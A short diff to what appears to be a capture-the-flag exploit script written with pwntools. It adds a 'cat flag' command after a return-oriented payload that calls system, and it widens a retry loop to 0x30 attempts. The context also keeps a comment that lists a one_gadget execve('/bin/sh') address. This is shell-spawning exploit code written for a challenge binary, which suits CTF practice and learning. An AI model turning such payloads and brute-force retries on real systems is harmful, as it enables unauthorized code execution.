@@ -59,7 +59,7 @@ def pwn(io):
     payload += p64(system_addr)
     io.sendlineafter("You grip your sword and shout:", payload)
 
-
+    io.sendline("cat flag")
     io.interactive()
 
 """
@@ -71,7 +71,7 @@ def pwn(io):
 0xef52b execve("/bin/sh", rbp-0x50, [rbp-0x78])
 
 """
-for i in range(10):
+for i in range(0x30):
     io = None
     try:
         io = getio()
